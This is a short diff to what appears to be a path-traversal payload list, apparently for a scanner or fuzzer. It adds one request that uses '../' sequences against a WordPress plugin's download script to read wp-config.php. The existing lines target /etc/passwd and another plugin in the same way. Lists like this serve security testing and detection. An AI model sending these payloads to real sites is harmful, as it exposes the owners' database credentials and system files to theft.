@@ -35,3 +35,4 @@
 /%2e%2e/%2e%2e/etc/passwd
 /path/to/vulnerable/endpoint
 /wp-content/plugins/wp-source-control/downloadfiles/download.php?path=../../../../wp-config.php
+/wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=../../../../wp-config.php
